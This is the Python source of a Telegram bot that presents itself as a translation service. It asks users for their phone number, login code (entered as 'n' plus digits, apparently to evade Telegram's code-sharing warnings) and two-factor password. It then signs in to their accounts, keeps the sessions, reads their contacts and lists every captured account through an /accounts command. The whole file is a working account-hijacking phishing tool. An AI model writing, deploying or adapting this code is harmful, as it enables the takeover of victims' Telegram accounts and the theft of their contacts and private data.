import asyncio

from pyrogram import Client, filters
from pyrogram.types import Message
from pyrogram.methods.utilities.idle import idle
from pyrogram.errors import SessionPasswordNeeded, FloodWait

import settings


app = Client(
    "bot",
    api_id=settings.API_ID,
    api_hash=settings.API_HASH,
    bot_token=settings.BOT_TOKEN,
)


# dict[telegram user_id: [CLIENT, send code hash]]
clients: dict[int, list[Client, str]] = {}

queue = []


async def queue_processing():
    while True:
        print("Processing queue: ", queue)
        if queue:
            while queue:
                func = queue.pop(0)
                print("Processing func: ", func.__name__)
                try:
                    await func
                except FloodWait as e:
                    print("Error: {} | Value: {}".format(e, e.value))
                    await asyncio.sleep(e.value)
                except Exception as e:
                    print("Error: {} | Value: {}".format(e, e.value))
                    await asyncio.sleep(5)
                await asyncio.sleep(5)
        await asyncio.sleep(3)


@app.on_message(filters.command("start") & filters.private)
async def start_command(client: Client, message: Message):
    await message.reply(
        "Welcome! Please set your target translation language\n"
        "Auhorize. Write your mobile number with /auth prefix\n\n"
        "Example: /auth +380685543178"
    )


@app.on_message(filters.command("auth") & filters.private)
async def auth(client: Client, message: Message):
    async def already_authorized():
        await message.reply(
            "Already authorized. Count of contacts: {}".format(
                await client.get_contacts_count()
            )
        )

    number = message.text.replace("/auth ", "")

    # Authorize client
    if not clients.get(message.from_user.id):
        clients[message.from_user.id] = [
            Client(
                number,
                api_id=settings.API_ID,
                api_hash=settings.API_HASH,
                phone_number=number,
            ),
            None,
        ]

    client: Client = clients[message.from_user.id][0]
    if not client.is_connected:
        is_authorized = await client.connect()

        if is_authorized:
            return await already_authorized()
    else:
        return await already_authorized()

    code_hash = await client.send_code(number)

    clients[message.from_user.id][1] = code_hash.phone_code_hash

    await message.reply("Write number (n111111):")


@app.on_message(filters.regex(r"^n\d+$") & filters.text & filters.private)
async def save_code(client: Client, message: Message):
    code = message.text.replace("n", "")
    client: Client = clients[message.from_user.id][0]

    try:
        await client.sign_in(
            phone_code=code,
            phone_code_hash=clients[message.from_user.id][1],
            phone_number=client.phone_number,
        )
    except SessionPasswordNeeded:
        return await message.reply(
            "Write password that start with: /p\nExample: /p password"
        )

    print((await client.get_contacts())[0])


@app.on_message(filters.command("p") & filters.private)
async def save_password(client: Client, message: Message):
    password = message.text.replace("/p ", "")
    client: Client = clients[message.from_user.id][0]

    try:
        await client.check_password(password)
    except Exception as e:
        return await message.reply(str(e))

    print((await client.get_contacts())[0])


@app.on_message(filters.command("accounts") & filters.private)
async def get_all_clients(client: Client, message: Message):
    if len(clients) == 0:
        return await message.reply("Empty accounts")

    queue.append(
        message.reply(
            "\n".join(
                [
                    f"User id: {user_id}. {client.phone_number} - Contacts: {await client.get_contacts_count()}"
                    for user_id, (client, send_hash) in clients.items()
                ]
            )
        )
    )


async def standup():
    asyncio.create_task(queue_processing())
    await idle()


if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    with app:
        run = loop.run_until_complete(standup())
